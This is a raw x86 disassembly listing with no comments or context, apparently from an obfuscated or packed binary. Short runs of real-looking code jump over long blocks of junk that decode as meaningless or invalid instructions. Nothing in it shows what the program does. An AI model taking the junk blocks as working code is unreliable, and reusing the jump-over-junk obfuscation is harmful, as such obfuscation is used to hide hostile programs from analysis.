  404105:	ror    DWORD PTR [eax+eiz*8],0xdb
  404109:	ret    0x8467
  40410c:	push   esp
  40410d:	lods   al,BYTE PTR ds:[esi]
  40410e:	mov    al,ds:0xa4c6655c
  404113:	stc    
  404114:	sub    al,0x22
  404116:	in     al,0x86
  404118:	cmp    DWORD PTR ss:[ebp+0x680003c0],0xbfa93b31
  404123:	dec    esp
  404124:	and    bl,ch
  404126:	mov    WORD PTR [ebp-0x34522cd1],ss
  40412c:	addr16 ret 
  40412e:	push   ecx
  40412f:	jecxz  0x4040c5
  404131:	dec    ecx
  404132:	sub    al,0xe1
  404134:	fisub  DWORD PTR [eax+ebp*4+0x3dc174b4]
  40413b:	jge    0x404191
  40413d:	(bad)  
  40413e:	push   ds
  40413f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404140:	adc    edi,ebx
  404142:	mov    al,0x7c
  404144:	cmp    eax,0xb844d3ec
  404149:	xchg   ebp,eax
  40414a:	repnz loopne 0x404180
  40414d:	xor    bl,BYTE PTR [eax-0x41905d51]
  404153:	or     DWORD PTR [ecx],esp
  404155:	sbb    esp,DWORD PTR ds:0x154931
  40415b:	ror    DWORD PTR [ecx+esi*1+0x7189a42f],1
  404162:	pop    esi
  404163:	fstp   TBYTE PTR [edx]
  404165:	(bad)  
  404166:	push   edi
  404167:	xchg   edx,eax
  404168:	das    
  404169:	dec    esi
  40416a:	loopne 0x4041a1
  40416c:	es pop ss
  40416e:	adc    DWORD PTR [eax-0x76],edi
  404171:	xor    ecx,DWORD PTR ds:0xbd1e741d
  404177:	or     DWORD PTR [edx],ecx
  404179:	fs sahf 
  40417b:	xor    eax,0xad8bf85e
  404180:	sahf   
  404181:	repz add ah,0xc7
  404185:	inc    ebp
  404186:	mov    ah,0x2
  404188:	add    BYTE PTR [eax],al
  40418a:	add    bh,al
  40418c:	inc    ebp
  40418d:	test   al,0x25
  40418f:	xor    al,BYTE PTR [eax]
  404191:	add    bh,al
  404193:	inc    ebp
  404194:	lods   al,BYTE PTR ds:[esi]
  404195:	shr    DWORD PTR [ecx],0x0
  404198:	add    BYTE PTR [ebx+0x42f52c3d],al
  40419e:	add    BYTE PTR [eax],al
  4041a0:	jge    0x4041d5
  4041a6:	or     ebx,edx
  4041a8:	jmp    0x4041d5
  4041ad:	push   0x6a4d
  4041b2:	push   DWORD PTR [ebp-0xc]
  4041b5:	push   0x42a605
  4041ba:	push   0x7215
  4041bf:	push   DWORD PTR [ebp-0x14]
  4041c2:	push   0x29a5
  4041c7:	push   0x4653
  4041cc:	push   DWORD PTR [ebp-0x10]
  4041cf:	call   DWORD PTR ds:0x438810
  4041d5:	mov    DWORD PTR [ebp-0x60],0x58dc
  4041dc:	jmp    0x4042b4
  4041e1:	adc    ebp,edx
  4041e3:	clc    
  4041e4:	sar    ecx,0xd3
  4041e7:	cmp    edi,edx
  4041e9:	cdq    
  4041ea:	dec    ebx
  4041eb:	mov    bl,BYTE PTR [edi+0x1ca7ffd5]
  4041f1:	(bad)  
  4041f2:	sbb    BYTE PTR [eax],al
  4041f4:	add    BYTE PTR [ebx-0x4a000000],bh
  4041fa:	stos   BYTE PTR es:[edi],al
  4041fb:	or     al,0xe4
  4041fd:	(bad)  
  4041fe:	adc    dh,BYTE PTR [eax+0x5cac9f34]
  404204:	adc    DWORD PTR [ecx],0x4c97c4b6
  40420a:	add    al,0x76
  40420c:	mov    ebp,0xdfd4f8fe
  404211:	xor    cl,BYTE PTR [eax-0x2344af9f]
  404217:	loop   0x4041fb
  404219:	dec    edx
  40421a:	hlt    
  40421b:	add    ebp,esi
  40421d:	cmp    edi,edx
  40421f:	or     ah,0xb8
  404222:	push   ss
  404223:	aas    
  404224:	fimul  DWORD PTR [ebx+eiz*1+0x49]
  404228:	inc    edi
  404229:	push   eax
  40422a:	clc    
  40422b:	jl     0x40428c
  40422d:	clc    
  40422e:	ins    DWORD PTR es:[edi],dx
  40422f:	and    eax,DWORD PTR [ebp+0x5a]
  404232:	mov    al,0x79
  404234:	xchg   ebp,eax
  404235:	sub    dl,BYTE PTR [edx]
  404237:	xchg   ebx,eax
  404238:	addr16 rcl ah,0x73
  40423c:	nop
  40423d:	jbe    0x404255
  40423f:	jg     0x404213
  404241:	stos   BYTE PTR es:[edi],al
  404242:	mov    al,ss:0x6e96fadc
  404248:	pop    ss
  404249:	in     al,0x3b
  40424b:	test   DWORD PTR [ecx-0x44d551d4],ebx
  404251:	jo     0x4041fd
  404253:	cmp    esp,0xffffffa1
  404256:	pop    esp
  404257:	jae    0x4041fe
  404259:	call   0x44dd:0x11bb1436
  404260:	test   ecx,0x90e5dc1e
  404266:	pusha  
  404267:	dec    ecx
  404268:	pop    es
  404269:	push   0x7438ae2c
  40426e:	lods   al,BYTE PTR ds:[esi]
  40426f:	hlt    
  404270:	loope  0x4042e4
  404272:	outs   dx,DWORD PTR ds:[esi]
  404273:	pop    ebp
  404274:	cmp    BYTE PTR [ecx+0x34a0ccda],ch
  40427a:	xchg   DWORD PTR [ebx+0x71],eax
  40427d:	leave  
  40427e:	inc    edx
  40427f:	xor    al,0x72
  404281:	add    esp,esp
  404283:	jmp    0x7188:0xed8e7663
  40428a:	jno    0x40424d
  40428c:	inc    ecx
  40428d:	push   ss
  40428e:	or     DWORD PTR [ebx-0x6efe599c],0x408aa6d6
  404298:	nop
  404299:	sbb    eax,0xed943151
  40429e:	sbb    dl,BYTE PTR [ecx]
  4042a0:	push   ebx
  4042a1:	test   DWORD PTR [edi-0x4b9faa9c],edx
  4042a7:	mov    BYTE PTR [ecx+ebx*4],ch
  4042aa:	sub    eax,0xc741cd64
  4042af:	jmp    0x404260
  4042b1:	int3   
  4042b2:	out    dx,eax
  4042b3:	in     al,0xc7
  4042b5:	inc    ebp
  4042b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042b7:	jl     0x404311
  4042b9:	add    BYTE PTR [eax],al
  4042bb:	mov    DWORD PTR [ebp-0x38],0xac8
  4042c2:	jmp    0x40439a
  4042c7:	(bad)  
  4042c8:	cmp    ebp,esi
  4042ca:	jl     0x4042ca
  4042cc:	std    
  4042cd:	lahf   
  4042ce:	sti    
  4042cf:	inc    edx
  4042d0:	pop    edi
  4042d1:	fst    DWORD PTR [ebp+0x25c89c6]
  4042d7:	xchg   ecx,eax
  4042d8:	sbb    DWORD PTR [eax],eax
  4042da:	add    BYTE PTR [ebx-0x7e000000],bh
  4042e0:	lods   eax,DWORD PTR ds:[esi]
  4042e1:	pop    eax
  4042e2:	xchg   edi,eax
  4042e3:	pop    ds
  4042e4:	lods   eax,DWORD PTR ds:[esi]
  4042e5:	dec    bl
  4042e7:	jmp    0x1af6:0xbd56d864
  4042ee:	(bad)  
  4042f0:	dec    eax
  4042f1:	fisttp QWORD PTR [eax]
  4042f3:	push   edx
  4042f4:	adc    BYTE PTR [edi+0x224b2031],cl
  4042fa:	xchg   ebp,eax
  4042fb:	dec    esp
  4042fc:	gs jg  0x4042d5
  4042ff:	aam    0x26
  404301:	cmp    al,0x8
  404303:	jno    0x4042cb
  404305:	mov    ch,0x20
  404307:	push   ebx
  404308:	push   ebp
  404309:	(bad)  
  40430a:	div    BYTE PTR ss:[esi]
  40430d:	jg     0x4042d0
  40430f:	sbb    esp,DWORD PTR [esi+0x18]
  404312:	jnp    0x40431d
  404314:	xor    dh,cl
  404316:	xor    eax,0xfab2bf95
  40431b:	xor    eax,0xeffc412
  404320:	fimul  WORD PTR [ebx-0x1e]
  404323:	add    al,0xab
  404325:	cmp    bh,dl
  404327:	sbb    eax,edx
  404329:	add    dl,BYTE PTR [edx-0x6941712c]
  40432f:	xor    DWORD PTR [eax-0x69293ac3],0x3f
  404336:	jae    0x404326
  404338:	xchg   DWORD PTR [esi-0x24],eax
  40433b:	dec    ebp
  40433c:	xchg   edx,eax
  40433d:	ss adc esp,edi
  404340:	dec    edi
  404341:	push   cs
  404342:	stos   DWORD PTR es:[edi],eax
  404343:	cdq    
  404344:	clc    
  404345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404346:	inc    edx
  404347:	sub    eax,DWORD PTR [ebp+0x58]
  40434a:	xchg   esi,eax
  40434b:	scas   al,BYTE PTR es:[edi]
  40434c:	dec    ebx
  40434d:	mov    dl,0xc3
  40434f:	ja     0x404349
  404351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404352:	arpl   WORD PTR [ebx+0x1e355a89],di
  404358:	lea    ecx,[ebp-0x3ec472b1]
  40435e:	nop
  40435f:	jmp    0xc1f:0x93c7fd32
  404366:	mov    al,ds:0xde233a46
  40436b:	outs   dx,BYTE PTR ds:[esi]
  40436c:	aas    
  40436d:	dec    esp
  40436e:	push   cs
  40436f:	or     edi,DWORD PTR ds:0x57aaf35f
  404375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404376:	sar    BYTE PTR ds:0x8fd869d2,cl
  40437c:	ret    0xb709
  40437f:	dec    esi
  404380:	(bad)  
  404381:	les    eax,FWORD PTR [ebp+0x2d2507cb]
  404387:	pop    es
  404388:	out    0x24,eax
  40438a:	(bad)  
  40438b:	and    bl,BYTE PTR [edx]
  40438d:	add    DWORD PTR [edi+0x395bbda7],0x5c
  404394:	(bad)  
  404395:	fcmove st,st(7)
  404397:	sbb    bh,cl
  404399:	mov    bh,0x45
  40439c:	int3   
  40439d:	fisttp WORD PTR [eax+0x0]
  4043a0:	add    BYTE PTR [ebx+0x4d8ba045],cl
  4043a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043a7:	mov    edx,DWORD PTR [ebp-0x58]
  4043aa:	movzx  ebx,BYTE PTR ds:0x42f638
  4043b1:	xor    DWORD PTR ds:0x42f558,ebx
  4043b7:	mov    ebx,DWORD PTR [ebp-0x54]
  4043ba:	jmp    0x404492
  4043bf:	jmp    0xffffb2ff
  4043c4:	(bad)  
  4043c5:	stc    
  4043c6:	jg     0x4043d4
  4043c8:	cmp    esi,DWORD PTR [edx-0x39]
  4043cb:	ficom  WORD PTR [ebp+0x1a4c02d0]
  4043d1:	add    BYTE PTR [eax],al
  4043d3:	mov    ebx,0xfc000000
  4043d8:	mov    ecx,0x2b7e8101
  4043dd:	hlt    
  4043de:	sub    ebx,ebx
  4043e0:	xor    eax,0xd96f4fce
  4043e5:	out    0x89,al
  4043e7:	es loop 0x4043da
  4043ea:	lahf   
  4043eb:	jns    0x404430
  4043ed:	add    bh,BYTE PTR [ebp-0x7f]
  4043f0:	sbb    eax,0x227568f4
  4043f5:	dec    edx
  4043f6:	retf   
  4043f7:	hlt    
  4043f8:	icebp  
  4043f9:	jle    0x40438c
  4043fb:	jo     0x40438d
  4043fd:	mov    ?,esi
  4043ff:	inc    ebx
  404400:	xor    BYTE PTR [ecx-0x7c0cc676],0x2
  404407:	jge    0x404482
  404409:	cmp    DWORD PTR [eax],ecx
  40440b:	xchg   esp,eax
  40440c:	jmp    0xe43ae30b
  404411:	jo     0x404463
  404413:	aaa    
  404414:	jo     0x404441
  404416:	cmp    BYTE PTR [edx],0xd4
  404419:	jne    0x404412
  40441b:	xlat   BYTE PTR ds:[ebx]
  40441c:	inc    ecx
  40441d:	adc    BYTE PTR [ebx-0x5a],bh
  404420:	ins    DWORD PTR es:[edi],dx
  404421:	dec    ecx
  404422:	outs   dx,DWORD PTR ds:[esi]
  404423:	ins    BYTE PTR es:[edi],dx
  404424:	pop    es
  404425:	or     esp,DWORD PTR [eax+0x6aea6aa4]
  40442b:	pusha  
  40442c:	inc    ebp
  40442d:	xor    al,0x8e
  40442f:	xchg   BYTE PTR [ebx-0x7f],bl
  404432:	ror    bl,0x16
  404435:	mov    DWORD PTR [edi-0x79d2cfd8],eax
  40443b:	push   ebp
  40443c:	adc    dh,0xba
  40443f:	stos   BYTE PTR es:[edi],al
  404440:	sbb    ebx,DWORD PTR [esi+0x735b667c]
  404446:	pop    ecx
  404447:	pop    esp
  404448:	sbb    DWORD PTR [esi-0x79],esi
  40444b:	cwde   
  40444c:	dec    BYTE PTR [esi-0x64]
  40444f:	mov    bh,ah
  404451:	mov    al,ds:0x773e7c8f
  404456:	and    eax,DWORD PTR [esi-0x4]
  404459:	call   0x750a9fef
  40445e:	xchg   edx,eax
  40445f:	xor    eax,0xb8b3d55f
  404464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404465:	ins    BYTE PTR es:[edi],dx
  404466:	mov    ebx,0xd5ad5fb7
  40446b:	inc    ebx
  40446c:	mov    ebp,0xe76b4b3a
  404471:	add    eax,0xe394461d
  404476:	mov    al,ds:0x47e9219a
  40447b:	adc    al,0xa5
  40447d:	pop    es
  40447e:	fsubp  st(2),st
  404480:	dec    eax
  404481:	fst    QWORD PTR [ebx]
  404483:	lods   eax,DWORD PTR ds:[esi]
  404484:	lods   al,BYTE PTR ds:[esi]
  404485:	pop    esp
  404486:	and    esp,0x74f5d351
  40448c:	pop    ss
  40448d:	mov    BYTE PTR [eax-0x80],bl
  404490:	cld    
  404491:	in     eax,dx
  404492:	add    eax,edx
  404494:	mov    edx,DWORD PTR [ebp-0x50]
  404497:	mov    DWORD PTR ds:0x42f534,0x2708
  4044a1:	adc    ecx,ebx
  4044a3:	mov    ebx,DWORD PTR [ebp-0x4c]
  4044a6:	push   ebx
  4044a7:	jmp    0x40457f
  4044ac:	mov    ebx,0xaf87a91c
  4044b1:	mov    bh,0xbf
  4044b3:	cmp    al,0x3
  4044b5:	leave  
  4044b6:	inc    ecx
  4044b7:	xor    ebp,DWORD PTR [edx+0x77aa770]
  4044bd:	sbb    eax,DWORD PTR [eax]
  4044bf:	add    BYTE PTR [ebx-0x69000000],bh
  4044c5:	loopne 0x404460
  4044c7:	sub    ch,BYTE PTR [esi+0x674cfeda]
  4044cd:	fstp   DWORD PTR [ecx]
  4044cf:	cld    
  4044d0:	push   eax
  4044d1:	outs   dx,DWORD PTR ds:[esi]
  4044d2:	mov    eax,0xb67cc8bc
  4044d7:	mov    cs,WORD PTR [esi]
  4044d9:	enter  0x51ff,0xde
  4044dd:	cmc    
  4044de:	adc    eax,0x2c4bff55
  4044e3:	pushf  
  4044e4:	push   0x31690d41
  4044e9:	call   0x4ecacb02
  4044ee:	xchg   esp,eax
  4044ef:	lock int 0x4c
  4044f2:	push   esi
  4044f3:	retf   
  4044f4:	call   0x4ec4e3b6
  4044f9:	test   DWORD PTR [edx+0x68c59ab0],esi
  4044ff:	add    eax,ecx
  404501:	iret   
  404502:	inc    ecx
  404503:	jo     0x404528
  404505:	mov    ch,0x22
  404507:	mov    dl,0x8a
  404509:	jbe    0x404577
  40450b:	fisub  DWORD PTR [ebx-0x3ec5ffed]
  404511:	mov    al,ds:0xc21955d1
  404516:	setnp  BYTE PTR [edx]
  404519:	retf   
  40451a:	inc    edx
  40451b:	rol    DWORD PTR [edx-0x2cc7dcbd],cl
  404521:	push   eax
  404522:	int3   
  404523:	loope  0x4044c4
  404525:	mov    esp,ecx
  404527:	call   0xc7244689
  40452c:	aam    0xea
  40452e:	ins    DWORD PTR es:[edi],dx
  40452f:	push   es
  404530:	call   0x5dae97a3
  404535:	add    BYTE PTR ds:0xc62d21cf,0x52
  40453c:	int3   
  40453d:	push   ss
  40453e:	mov    ds:0xd7f0d996,eax
  404543:	push   cs
  404544:	add    BYTE PTR [bp-0x4e],cl
  404548:	xor    ebp,DWORD PTR ds:0x22485fb5
  40454e:	mov    ecx,0xfc77b280
  404553:	cwde   
  404554:	fwait
  404555:	add    ecx,esp
  404557:	xchg   esp,eax
  404558:	cmp    bl,BYTE PTR [ebp+0x7b]
  40455b:	mov    eax,0x3d3d225
  404560:	test   eax,0x69e38196
  404565:	push   ds
  404566:	mov    ebx,0x917fd75
  40456b:	(bad)  
  40456c:	and    esi,eax
  40456e:	jecxz  0x404578
  404570:	das    
  404571:	xor    eax,0xd6224e1e
  404576:	dec    edi
  404577:	repnz mov bl,0x59
  40457a:	dec    ebx
  40457b:	daa    
  40457c:	call   0x6c35:0x8152f990
  404583:	cmc    
  404584:	inc    edx
  404585:	add    BYTE PTR [eax+0x510042f5],dl
  40458b:	adc    DWORD PTR ds:0x42f620,0x42f594
  404595:	push   eax
  404596:	and    DWORD PTR ds:0x42f654,0x5c90
  4045a0:	call   0x423dad
  4045a5:	xor    edx,edx
  4045a7:	mov    ecx,DWORD PTR [ebp-0x38]
  4045aa:	mov    edx,DWORD PTR [ebp-0x34]
  4045ad:	and    DWORD PTR ds:0x42f574,ebx
  4045b3:	mov    edx,0x4441
  4045b8:	xor    DWORD PTR ds:0x42f5dc,edi
  4045be:	sub    edx,ecx
  4045c0:	mov    DWORD PTR ds:0x42f560,0x1de2
  4045ca:	mov    ecx,DWORD PTR [ebp+0x14]
  4045cd:	adc    DWORD PTR ds:0x42f5d4,edi
  4045d3:	and    eax,0x1024
  4045d8:	or     edx,0x5cfd
  4045de:	sub    edx,eax
  4045e0:	mov    eax,DWORD PTR [ebp-0x8]
  4045e3:	lea    eax,[edx+eax*1-0x6df9]
  4045ea:	dec    DWORD PTR ds:0x42f660
  4045f0:	add    eax,DWORD PTR [ebp+0x28]
  4045f3:	xor    edx,ebx
  4045f5:	jmp    0x4046cd
  4045fa:	clc    
  4045fb:	xor    BYTE PTR [eax],ch
  4045fd:	ret    
  4045fe:	call   0x587c41de
  404603:	xor    eax,edi
  404605:	xor    esi,ecx
  404607:	inc    ebp
  404609:	ret    
  40460a:	ret    0x1b
  40460d:	add    BYTE PTR [ebx+0x50000000],bh
  404613:	rol    BYTE PTR [eax+0x573324e3],1
  404619:	xor    eax,0xc7fccadb
  40461e:	sahf   
  40461f:	add    esi,ebx
  404621:	mov    edx,0xb3f7fc97
  404626:	cmp    ebp,DWORD PTR [esi]
  404628:	int3   
  404629:	pop    ebx
  40462a:	(bad)  
  40462b:	pop    esp
  40462c:	jp     0x4045f5
  40462e:	jmp    0x88dfc019
  404633:	dec    ecx
  404634:	out    0x99,eax
  404636:	out    dx,al
  404637:	ins    BYTE PTR es:[edi],dx
  404638:	add    DWORD PTR [ecx-0x66],0x272a7ee3
  40463f:	adc    al,0xd2
  404641:	mov    WORD PTR [ebx],ss
  404643:	and    dh,BYTE PTR [eax+0x64fe7440]
  404649:	unpcklps xmm5,XMMWORD PTR [eax]
  40464c:	sub    ebp,esp
  40464e:	xor    DWORD PTR [eax],edx
  404650:	(bad)  
  404652:	sbb    cl,BYTE PTR [esi]
  404654:	xlat   BYTE PTR ds:[ebx]
  404655:	dec    ebp
  404656:	pop    esp
  404657:	mov    dh,0x9e
  404659:	and    ax,0xf0a4
  40465d:	pop    ecx
  40465e:	and    ch,BYTE PTR [ebx+0x48d89d3]
  404664:	cmp    al,0x8a
  404666:	dec    esi
  404667:	lahf   
  404668:	loope  0x40460d
  40466a:	mov    eax,?
  40466c:	cdq    
  40466d:	cmp    esp,DWORD PTR [edi]
  40466f:	xor    DWORD PTR [eax+0xa97e004],ecx
  404675:	xor    BYTE PTR [eax],ah
  404677:	and    BYTE PTR [ebx],0x46
  40467a:	ja     0x4046f3
  40467c:	stos   DWORD PTR es:[edi],eax
  40467d:	mov    bh,BYTE PTR [ecx+0x3f9ac3fe]
  404683:	adc    bh,BYTE PTR [edx+ebp*8+0x56]
  404687:	cmc    
  404688:	push   cs
  404689:	jge    0x404682
  40468b:	push   ss
  40468c:	ror    BYTE PTR [ebp+eiz*4-0x80],1
  404690:	mov    ch,0x46
  404692:	cli    
  404693:	loop   0x404684
  404695:	fucomp st(1)
  404697:	(bad)  
  404699:	mov    edx,gs
  40469b:	les    esp,FWORD PTR [esi-0x6b]
  40469e:	push   ss
  40469f:	call   0x7a4bad99
  4046a4:	mov    eax,ds:0x24078313
  4046a9:	mov    ds:0x2336c550,al
  4046ae:	out    0xa,al
  4046b0:	push   ds
  4046b1:	push   cs
  4046b2:	lea    ebp,[ecx+0x1b]
  4046b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046b6:	and    bl,al
  4046b8:	call   0xed91cccf
  4046bd:	mov    al,ds:0x37d684a3
  4046c2:	jb     0x4046aa
  4046c4:	hlt    
  4046c5:	inc    edi
  4046c6:	dec    ebx
  4046c7:	daa    
  4046c8:	jp     0x4046f4
  4046ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046cb:	and    BYTE PTR [edx+0xacffbb],cl
  4046d1:	add    BYTE PTR [ecx+0x42f6541d],al
  4046d7:	add    BYTE PTR [edx-0x76ffff97],ch
  4046dd:	inc    ebp
  4046de:	clc    
  4046df:	mov    eax,DWORD PTR [ecx]
  4046e1:	movzx  edx,BYTE PTR ds:0x42f590
  4046e8:	adc    edx,DWORD PTR ds:0x42f58c
  4046ee:	mov    DWORD PTR ds:0x42f590,edx
  4046f4:	mov    edx,DWORD PTR [ecx+0x4]
  4046f7:	sub    DWORD PTR ds:0x42f650,0x42f630
  404701:	jmp    0x4047d9
  404706:	add    DWORD PTR [edi],eax
  404708:	out    0xfc,eax
  40470a:	out    0xfc,eax
  40470c:	sbb    edi,edi
  40470e:	and    esp,DWORD PTR [eax]
  404710:	mov    bl,0xe4
  404712:	(bad)  
  404713:	push   ecx
  404714:	mov    eax,ds:0x1c7d8e
  404719:	add    BYTE PTR [ebx+0x61000000],bh
  40471f:	add    al,0x82
  404721:	jp     0x4046cd
  404723:	icebp  
  404724:	outs   dx,DWORD PTR ds:[esi]
  404725:	sbb    al,ch
  404727:	icebp  
  404728:	cmp    al,0xc0
  40472a:	dec    edi
  40472b:	xor    al,0xe9
  40472d:	out    dx,eax
  40472e:	mov    bh,0x77
  404730:	outs   dx,DWORD PTR ds:[esi]
  404731:	in     al,dx
  404732:	mov    eax,ds:0x7ff75d8c
  404737:	sbb    eax,0x94a56341
  40473c:	mov    dl,0xbf
  40473e:	inc    ebp
  40473f:	jnp    0x404756
  404741:	cs push cs
  404743:	sahf   
  404744:	int3   
  404745:	inc    edx
  404746:	fwait
  404747:	leave  
  404748:	sbb    eax,0x25478c80
  40474d:	stc    
  40474e:	(bad)  
  40474f:	pusha  
  404750:	out    0x57,al
  404752:	ffree  st(3)
  404754:	(bad)  
  404755:	cmc    
  404756:	pandn  mm1,mm2
  404759:	and    BYTE PTR [ebp+0x2c50d7c7],0xa
  404760:	out    dx,eax
  404761:	xchg   edx,eax
  404762:	dec    esp
  404763:	repz hlt 
  404765:	and    ebx,esp
  404767:	inc    esp
  404768:	jnp    0x404717
  40476a:	mov    ebp,0x8aa8df31
  40476f:	stos   DWORD PTR es:[edi],eax
  404770:	loop   0x4047e5
  404772:	loope  0x4047b4
  404774:	push   ecx
  404775:	out    0x92,eax
  404777:	inc    ecx
  404778:	cwde   
  404779:	arpl   WORD PTR [esi+0xd9d0765],ax
  40477f:	and    DWORD PTR [esi+0x6914188],edi
  404785:	inc    edx
  404786:	retf   0x33fd
  404789:	out    0x37,al
  40478b:	inc    ebx
  40478c:	aaa    
  40478d:	xchg   BYTE PTR fs:[esi-0x41a2758c],dl
  404794:	out    0x63,al
  404796:	dec    ebp
  404797:	xor    eax,DWORD PTR [esi-0x47a1d7fa]
  40479d:	aam    0x44
  40479f:	push   eax
  4047a0:	sub    eax,0xca6b0f8b
  4047a5:	adc    eax,DWORD PTR [esi+eiz*2+0x4209bff1]
  4047ac:	ins    DWORD PTR es:[edi],dx
  4047ad:	jp     0x40478f
  4047af:	(bad)  
  4047b0:	call   0x7f76:0x25185a89
  4047b7:	rcr    DWORD PTR [edx],cl
  4047b9:	test   edx,edx
  4047bb:	fs xchg ecx,eax
  4047bd:	sbb    bl,BYTE PTR gs:[ebx-0x1b]
  4047c1:	repnz adc DWORD PTR [edi+eiz*2+0x8f2e390],0xae247738
  4047cd:	cld    
  4047ce:	dec    esp
  4047cf:	sar    edx,1
  4047d1:	push   ss
  4047d2:	ins    BYTE PTR es:[edi],dx
  4047d3:	inc    edi
  4047d4:	jb     0x4047f4
  4047d6:	or     ebp,DWORD PTR ds:0x8bc6330a
  4047dc:	adc    eax,0x42f5cc
  4047e1:	or     DWORD PTR ds:0x42f568,edx
  4047e7:	jmp    0x4048bf
  4047ec:	jns    0x4047ef
  4047ee:	mov    esp,0x7dbdfcb1
  4047f3:	leave  
  4047f4:	(bad)  
  4047f6:	scas   al,BYTE PTR es:[edi]
  4047f7:	mov    edi,0xde2f13f3
  4047fc:	cmp    BYTE PTR ds:0xbb0000,bl
  404802:	add    BYTE PTR [eax],al
  404804:	xchg   edi,eax
  404805:	ficomp DWORD PTR [edi-0x15efb6eb]
  40480b:	mov    ecx,0x1517183e
  404810:	inc    ebx
  404811:	adc    DWORD PTR [eax-0x5],edx
  404814:	push   esi
  404815:	shr    BYTE PTR [ebx+0x1a44a5c9],cl
  40481b:	clc    
  40481c:	pop    ebp
  40481d:	jle    0x404844
  40481f:	inc    esp
  404820:	pop    ds
  404821:	mov    ds:0x39815f65,al
  404826:	enter  0x10e,0x43
  40482a:	xchg   esi,eax
  40482b:	pop    ebp
  40482c:	push   es
  40482d:	mov    edx,0x2b108da9
  404832:	push   ss
  404833:	gs mov bl,0xc7
  404836:	pop    ecx
  404837:	call   0x4ebbbc6a
  40483c:	dec    edx
  40483d:	xchg   edi,ecx
  40483f:	jbe    0x4048be
  404841:	sub    bh,BYTE PTR [eax+edi*4]
  404844:	mov    esp,0x714315dc
  404849:	and    al,ah
  40484b:	sub    DWORD PTR [edx],esp
  40484d:	adc    DWORD PTR [esi+edx*4+0x5c],ebp
  404851:	mov    esp,0x28f4716b
  404856:	imul   eax,ebx,0x41
  404859:	and    al,0xc0
  40485b:	aad    0x7
  40485d:	into   
  40485e:	pushf  
  40485f:	(bad)  
  404860:	push   cs
  404861:	cmp    edx,DWORD PTR ds:0x50a6891f
  404867:	sub    al,0x1a
  404869:	sub    DWORD PTR [ecx+0x5c886cf2],edi
  40486f:	out    dx,al
  404870:	sub    DWORD PTR [ebp-0x4f13cdff],esi
  404876:	adc    eax,0x4726a613
  40487b:	xchg   ebp,eax
  40487c:	mov    ds:0x379df95d,al
  404881:	xchg   ebx,eax
  404882:	test   eax,0xeefd6cb7
  404887:	mov    ebx,0x77f21605
  40488c:	out    dx,al
  40488d:	outs   dx,DWORD PTR gs:[esi]
  40488f:	retf   0xad8d
  404892:	inc    ebx
  404893:	or     al,0x8d
  404895:	jno    0x404869
  404897:	mov    ds:0xcb1007fb,eax
  40489c:	gs enter 0xf3f5,0xc9
  4048a1:	push   ds
  4048a2:	mov    eax,ebx
  4048a4:	int    0xf8
  4048a6:	dec    ebp
  4048a7:	lds    edx,FWORD PTR [ecx+ebx*4]
  4048aa:	fwait
  4048ab:	lds    esp,FWORD PTR [ecx]
  4048ad:	cmc    
  4048ae:	int3   
  4048af:	out    dx,al
  4048b0:	cld    
  4048b1:	fcomp  QWORD PTR [ebp-0x6cfff130]
  4048b7:	cmp    BYTE PTR [edx-0xcb032ae],cl
  4048bd:	push   0xdc458942
  4048c2:	mov    eax,ds:0x42f6f4
  4048c7:	mov    edx,DWORD PTR ds:0x42c024
  4048cd:	sub    eax,edx
  4048cf:	xor    eax,DWORD PTR [eax+edx*1]
  4048d2:	mov    eax,DWORD PTR [ecx]
  4048d4:	cmp    DWORD PTR ds:0x42f574,0x0
  4048db:	jb     0x4048fe
  4048e1:	movzx  edx,WORD PTR ds:0x42f678
  4048e8:	and    DWORD PTR ds:0x42f594,edx
  4048ee:	jmp    0x4048fe
  4048f3:	push   0x26e4
  4048f8:	call   DWORD PTR ds:0x438814
  4048fe:	mov    edx,DWORD PTR [ecx+0x4]
  404901:	jmp    0x4049d9
  404906:	pop    ebp
  404907:	push   edx
  404908:	jmp    0xd1db:0x7dfeefd6
  40490f:	sar    BYTE PTR [edx+eax*1+0x6da71671],1
  404916:	repz sbb eax,0xbb0000
  40491c:	add    BYTE PTR [eax],al
  40491e:	rcl    DWORD PTR [eax-0x72],cl
  404921:	test   DWORD PTR ds:0x13df03e8,ecx
  404927:	mov    esi,0x600a066f
  40492c:	pop    ss
  40492d:	sbb    eax,0x59c74fff
  404932:	xchg   ecx,eax
  404933:	mov    WORD PTR [ecx],ds
  404935:	jae    0x404978
  404937:	or     DWORD PTR [ecx],esi
  404939:	mov    al,0xec
  40493b:	sti    
  40493c:	push   0x25533d02
  404941:	or     al,0xce
  404943:	(bad)  
  404945:	push   ebx
  404946:	xchg   esi,eax
  404947:	(bad)  
  404948:	faddp  st(3),st
  40494a:	inc    ebx
  40494b:	nop
  40494c:	(bad)  
  40494e:	scas   al,BYTE PTR es:[edi]
  40494f:	dec    ebp
  404950:	mov    DWORD PTR [ecx+0x55],eax
  404953:	or     BYTE PTR [eax-0x5f4dbbaf],0x6b
  40495a:	jae    0x404984
  40495c:	test   BYTE PTR [edi+0x5c],0x13
  404960:	adc    ebx,DWORD PTR [edi-0x28]
  404963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404964:	add    eax,0xf8a7d6cf
  404969:	rcr    BYTE PTR [esi+0x255a9eb],cl
  40496f:	nop
  404970:	dec    ebx
  404971:	and    esi,DWORD PTR [eax-0xa]
  404974:	or     DWORD PTR [ebp-0x15efaa03],eax
  40497a:	cmp    BYTE PTR [eax],0x34
  40497d:	or     al,0xf9
  40497f:	jbe    0x40494f
  404981:	jle    0x4049a8
  404983:	xor    BYTE PTR [ecx],cl
  404985:	add    al,al
  404987:	stos   DWORD PTR es:[edi],eax
  404988:	or     ecx,edi
  40498a:	in     al,dx
  40498b:	xor    dh,dl
  40498d:	jnp    0x404958
  40498f:	or     al,0xbd
  404991:	sbb    ebp,DWORD PTR [edx+eax*8-0x35]
  404995:	and    al,0x8c
  404997:	push   ecx
  404998:	lock std 
  40499a:	push   ds
  40499b:	mov    ds:0x3a30704f,eax
